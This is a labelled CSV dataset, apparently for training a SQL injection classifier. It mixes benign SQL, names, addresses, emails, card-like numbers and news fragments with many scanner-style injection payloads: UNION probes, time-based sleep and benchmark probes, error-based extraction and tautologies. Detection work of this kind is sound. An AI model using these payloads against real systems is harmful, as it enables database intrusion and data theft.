Sentence,Label
"SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern ;",0
SELECT COUNT ( DISTINCT say )  FROM blind,0
-2402 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) -- szgq,1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2874' LIMIT 1,0
" However , theoretically , possible ",0
"-9718%""  )   union all select 9515,9515,9515#",1
kjell,0
virella altimirs,0
grimsley,0
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( ""%"" = """,1
friera de valverde,0
antonino,0
SELECT expression FROM organized,0
 or user like '%,1
brihuega uslet,0
rosilda,0
" In Oregon , planners experimenting giving drivers different choices ",0
karzau@asdn.edu,0
037r20n0do,0
-7319 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
SELECT * FROM route ORDER BY he,0
alexio,0
2282507276163108,0
goudon,0
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",1
SELECT * FROM bush WHERE five NOT LIKE 'bite%',0
primera 152 11-g,0
-2817 )  where 1212 = 1212 or 3266 = 1102,1
SELECT globe ( s )  FROM shirt UNION ALL,0
"-8448%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1
"SELECT LOCATE ( ""3"", ""W3Schools.com"" )  AS MatchPosition;",0
monegrillo,0
polesello@tantomontamontatanto.int,0
afijacin,0
02143129n,0
SELECT * FROM satellites WHERE comfortable NOT LIKE '[tone]%',0
protectorio,0
DELETE FROM cloud WHERE happy = 'wash',0
tarik,0
neceta,0
ayca mols,0
mcallum,0
"1 )  as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
SELECT * FROM cell FETCH FIRST 50 PERCENT ROWS ONLY,0
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1
sevilla subauste,0
"-4091  )  )   as lqqy where 3030 = 3030 union all select 3030,3030,3030#",1
suau feixa,0
"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'lyem' like 'lyem",1
9019896710304929,0
-2530%' order by 1#,1
"1"" where 4066 = 4066 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
 The budget &quot; L-Missions &quot; lies around one billion Euro ,0
verdon.denissis@esencialser.cv,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28557 )  ORDER BY meta_id ASC",0
lorber-albasiny@cortinasartesol.pa,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 5432 = 5432",1
SELECT * FROM yellow WHERE    NOT now = 'bend',0
"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",1
"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",1
 One said high-ranking member Berlin ,0
"copons, 11",0
"   SELECT COUNT ( night ) , recall FROM society BY obtain",0
SELECT * FROM end WHERE foot NOT LIKE 'zipper%',0
"1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
9962031188070357,0
"1%' )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
tiedeman,0
SELECT COUNT ( those )  FROM mission,0
9231205976119063,0
30hi6h571ar,0
"  SELECT fox AS north, ahead AS [each]  FROM office",0
SELECT AVG ( breath ) FROM protection,0
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1
puente la reina/gares,0
90946866j,0
"1 )  where 7600 = 7600 union all select null,null,null,null,null,null--",1
1 rlike sleep ( 5 ) #,1
" On occasion Geisingen town anniversary , new chronicle also published ",0
SELECT heart,0
-5116  )   or   (  8287  =  4930  )  *4930,1
rosselot azcona,0
m6tr0cu029o8,0
1'+  (  select 'yhcf' where 8367  =  8367,1
SELECT * FROM clay FETCH FIRST 50 PERCENT ROWS ONLY,0
cabot@eurograb.tel,0
SELECT down ( s )  FROM drove UNION,0
"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",1
5ictoriosamente,0
1'  )   where 6092  =  6092,1
SELECT * FROM brave WHERE thread = 'fully' FETCH FIRST 3 ROWS ONLY,0
"  SELECT Orders.particlesrID, Employees.definition, Employees.only FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.containID ORDER BY Orders.railroadID",0
SELECT * FROM space WHERE place NOT BETWEEN 'barn' AND 'forest',0
1'  )   as kqbh where 6138  =  6138,1
"1%'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1
1'|| ( select 'qgnz' where 6446 = 6446,1
"1' in boolean mode  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  #",1
" Already stamp duty take residential property boroughs Westminster Kensington &amp; Chelsea , stood £ 708 million 2012 / 13 tax year , exceeds combined total Northern Ireland , Wales , Scotland , North East , North West Yorkshire Humber put together ",0
1' where 2690  =  2690,1
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
SELECT * FROM her WHERE yes BETWEEN deep09/01/1996slept AND division15/31/1996aware,0
6160253696929665,0
"1""  )  )   as szxa where 1501 = 1501 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1"" )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( ""nkgd"" = ""nkgd",1
4190369223587522,0
-1087 )  where 5787 = 5787 union all select 5787#,1
"  SELECT share,direct,what FROM without LEFT JOIN Orders ON appropriate.greatestID =  you.creature ORDER BY raise.mission",0
1g73g04735,0
SELECT * FROM nothing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM club,0
22571,0
rebolledo tabernero,0
"INSERT INTO town  ( off, principal, back )  VALUES  ( 'chose', 'missing', 'transportation' )  ",0
" SELECT column_name ( s )  FROM father,wide",0
-4215 )  where 5782 = 5782 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
SELECT * FROM office WHERE pure = 'throw'  AND  ( flag = 'pilot' OR rest = 'character' ) ,0
DELETE FROM lead WHERE thus = 'trouble',0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",1
"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( 'knhm' = 'knhm",1
marielle,0
revivificar,0
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",1
SELECT * FROM central FETCH FIRST 50 PERCENT ROWS ONLY,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'nbsf' like 'nbsf",1
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",1
"1%"" and 2805 = 1345",1
03827,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",1
"1%'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  '%' = '",1
20629413t,0
pia rusch,0
"select * from generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limit 1--",1
83513142g,0
1'  )  )   as qpai where 2619 = 2619,1
"1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'ochr' like 'ochr",1
-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,1
kavaler,0
"5%) experiencing uptick , according research Savills ",0
agn,0
"1%' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
SELECT * FROM private WHERE mental IN  ( SELECT thousand FROM silence ) ,0
SELECT * FROM identity WHERE nature = 'bottom' FETCH FIRST 3 ROWS ONLY,0
"1 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  -- nqdb",1
"payo gomez 188, 4-c",0
rost jorge,0
"1"" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""vziz"" = ""vziz",1
"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz",1
bili,0
1'  )   where 6222  =  6222 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
e88r6bera,0
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367748 )  ORDER BY meta_id ASC",0
hi' or 1 = 1 --,1
-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,1
select   (  case when   (  8916  =  1357  )   then 8916 else 8916*  (  select 8916 from information_schema.character_sets  )   end  )  #,1
"-7491"" )  as cnrn where 3635 = 3635 order by 1#",1
c39ine8ra,0
gareth,0
" Similarly UK , Flight Centre &apos;s leisure business performed well corporate clients spending less ",0
"1  )  )   as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
1'  )   where 5145  =  5145,1
"-7553%"" or 3571  =  2886",1
8590730598040371,0
49660,0
"  SELECT truckID AS ID, article AS death FROM live",0
vila-rodona,0
SELECT TOP 3 * FROM meet,0
folsom_talli@esteticadayda.tel,0
SELECT * FROM dance ORDER BY dark,0
d75a4r45der,0
"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
" select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1",1
gamarnik9,0
"1  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( 6556 = 6556",1
flaviano,0
SELECT * FROM right FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grow,0
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",1
alavez anabalon,0
SELECT COUNT ( DISTINCT seeing )  FROM swimming,0
16856,0
sinesio,0
jaraicejo,0
nolie,0
"plaa zenobia camprubi, 81, 13-d",0
 end and  ( 'jzlr' = 'jzlr,1
"1' where 9994 = 9994 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
 end and   (  (   ( 3673 = 3673,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3836 )  ORDER BY meta_id ASC",0
SELECT bill,0
lomoviejo,0
"1   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   7992  =  7992",1
"mesas, las",0
SELECT * FROM shut WHERE five = 'combine'  OR wore = 'put',0
SELECT AVG ( wrote )  FROM straw  SELECT SUM ( love ) ,0
SELECT DISTINCT badly FROM pot,0
SELECT AVG ( Price ) FROM upward,0
fontanal callarisa,0
1 )  as nsdy where 7513 = 7513,1
SELECT * FROM younger WHERE teach = 'could',0
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",1
 evening mass St,0
"   SELECT COUNT ( atom ) , consonant FROM basket BY shinning",0
SELECT animal FROM first,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( '%' = '",1
casals oficial,0
SELECT COUNT ( leather ) FROM play,0
wieth@camiones-hibridos.md,0
"1  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  4686 = 4686",1
SELECT tide FROM aboard,0
SELECT * FROM sheet WHERE NOT third = 'mean'  AND NOT sort = 'likely',0
"1'+  (  select 'qmtx' where 6992  =  6992 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1' )  as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
brbara,0
7196721387049140,0
steen@necesitouncredito.vu,0
"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1
4135,0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID IN  ( 28074 )  AND wp_posts.post_type  =  'nav_menu_item' AND   (  (  wp_posts.post_status  =  'publish'  )  )   ORDER BY wp_posts.menu_order ASC,0
"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
-8234'   )    )     )   or 9323  =  9323#,1
SELECT * FROM born 3 SELECT * FROM meant,0
pusit@marketingmunicipal.ro,0
 select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
1 and   (  3437  =  2271  )  *2271,1
"1  )  )   union all select null,null,null,null,null,null,null,null--",1
 US authorities described four foot three foot tunnel one sophisticated secret passages ever discovered ,0
" From fascinating view world-famous skyline , particularly impressive evening light ",0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  #",1
caf12n,0
5825253039721313,0
50212,0
8096640532589515,0
1' )  as pxcd where 9754 = 9754 or sleep ( 5 ) --,1
"   SELECT produce, forgot+ ', ' + gate+ ' ' + route+ ', ' + old AS exist  FROM moon",0
"-5587%' )  or elt ( 1032 = 1032,3623 )  and  ( '%' = '",1
nuttall,0
"c/ duran 52,",0
"1""  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( ""dwcy"" = ""dwcy",1
 I see day coming towns municipalities get fed clearing - fast food chains operate deposit scheme bags ,0
ditte pallars,0
SELECT * FROM floating WHERE occasionally = 'built' FETCH FIRST 3 ROWS ONLY,0
5060539995942562,0
1%'   )    )     )   and 2444  =  9282#,1
 Morris second-year student Harvard Medical School ,0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""sfbc""  =  ""sfbc",1
47239,0
elysee,0
1' )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'xazf' = 'xazf,1
tarsky,0
1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
SELECT religious FROM vegetable UNION ALL SELECT again FROM paper ORDER BY dark,0
0824507714934281,0
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1
sofronio,0
"iif ( 3447 = 1084,1,1/0 ) ",1
"1'|| ( select 'neqi' where 6873 = 6873 union all select null,null,null,null,null,null,null--",1
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",1
"1 )  as attr where 8085 = 8085 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT needle ( s )  FROM catch,0
"1%"" and 2006  =  2006",1
"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",1
SELECT * FROM complex WHERE NOT nervous = 'slept'  AND NOT real = 'pie',0
SELECT * FROM replace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM policeman,0
 The reforms plan accumulated assets parishes retained specified purpose ,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( '%' = '",1
simhan,0
SELECT * FROM stopped ORDER BY hall,0
1'  )   where 2511  =  2511 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
 The crime caused nationwide horror ,0
c/ cofa 39,0
"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",1
SELECT * FROM night WHERE soldier = 'past' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM same WHERE    NOT simply = 'south',0
"1' in boolean mode )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) #",1
partello,0
SELECT * FROM  ( SELECT hollow FROM track ) ,0
"   SELECT street, money+ ', ' + factory+ ' ' + leather+ ', ' + topic AS smoke  FROM stepped",0
SELECT * FROM accident  WHERE chair NOT LIKE '[yes]%',0
irina,0
" Some appear utterly frightened , others perceive &quot; blatant attempt blackmail &quot; population , continued press release citizen &apos;s initiative ",0
retuerta fong,0
kato,0
1 where 9774  =  9774,1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'vnkr' like 'vnkr,1
silb7dor,0
25576,0
4676150000000000,0
select pg_sleep  (  5  ) ,1
SELECT * FROM seed WHERE idea = 'contain'  OR continued = 'science',0
grace,0
" SELECT * FROM seems ORDER BY feathers, wave",0
3400796495784367,0
"-9111"" or 3038  =  3038",1
pablo,0
fedra,0
SELECT * FROM rather 3 SELECT * FROM prove,0
"  SELECT four,stronger,yourself FROM quick LEFT JOIN Orders ON almost.shortID =  stems.once ORDER BY bend.tide",0
"-3436 )  or elt ( 1032 = 1032,3623 ) ",1
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
"1%""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1%'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( '%' = ',1
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"or 1  =  1 or """"  =  ",1
edelman1@hotelestopsecret.mt,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1
yahed,0
SELECT * FROM mice WHERE wrong = 'offer' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( DISTINCT third )  FROM passage,0
select  ( case when  ( 9299 = 2760 )  then 1 else 9299* ( select 9299 from master..sysdatabases )  end ) --,1
"passatge brancatges, 104",0
"   SELECT represent,center,square,might,tube     (  (  diameter JOIN sheet ON result.another =  cold.shelf )   INNER JOIN politicalON Orders.stock =  written.seeID ) ",0
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,1
6743670000000000,0
SELECT * FROM species ORDER BY love,0
"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1
 I guess &apos;s nothing wrong going traditional ,0
"calle isis, 152,",0
 Open-air concert accompanied high summer temperatures ,0
"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
ribera vitols,0
7207770000000000,0
mabby,0
97573176t,0
32505,0
SELECT COUNT ( valueID ) FROM he,0
-8966%' or   (  7475  =  4014  )  *4014 and '%'  =  ',1
SELECT TOP 50 PERCENT * FROM to SELECT * FROM cook FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM surrounded,0
"iif  (  4436  =  8910,1,1/0  )  ",1
"-3177'   )    )    union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",1
teverga,0
alfa71ta,0
select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"  SELECT gradeID AS ID, over AS entirely FROM but",0
yanil,0
1%' )  waitfor delay '0:0:5' and  ( '%' = ',1
"ramiro de maeztu, s/n 8c",0
1'||  (  select 'awic' where 5227  =  5227,1
"-3604' )  as fyev where 7259 = 7259 union all select 7259,7259,7259,7259--",1
beardsley@bidrain.lv,0
-9389'  )   or 8859  =  3989--,1
arrego76arse,0
SELECT AVG ( certain ) FROM globe,0
38036492n,0
albea,0
"1"" )  where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
reig femenia,0
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1
"INSERT INTO method ( nice, talk, meet, thought, scientific, just )  VALUES  ( 'curious', 'victory'. principle', 'finish', 'independent', 'built', 'married' )  ",0
 Travelling BVB fans created terrible scenes flares Veltins Arena district derby Schalke Borussia Dortmund announced would serious consequences ,0
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'jrpk' = 'jrpk,1
"1"" )  as cysq where 5258 = 5258",1
7548,0
imokoude@transportesvegasl.et,0
"1"" )  where 6128 = 6128 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
15994230f,0
" SELECT column_name ( s )  FROM drawn,lose",0
 But passengers &apos;t expect changes happen immediately ,0
murero,0
2237,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1
SELECT * FROM were WHERE cloth IN  ( SELECT balloon FROM minerals ) ,0
parra,0
"1 and elt ( 4249 = 4249,7259 ) -- meef",1
" end and    (    (   ""kvts"" like ""kvts",1
kaz,0
9665,0
"1%"" )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( ""%"" = """,1
5115,0
03307827j,0
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1
SELECT AVG ( final ) FROM wear,0
oros thme,0
1'  )   as pudv where 2609  =  2609,1
"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",1
"1"" where 7631 = 7631 and 4733 = 3439",1
vannuchhi_ecoffery@hotelesjerez.vc,0
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe",1
bezante,0
24174,0
"1  )  )   as aqpy where 4027 = 4027 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
sylvia,0
SELECT * FROM port FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM forgotten,0
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-2548""   )    )     )   or 5107  =  8049--",1
 They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0
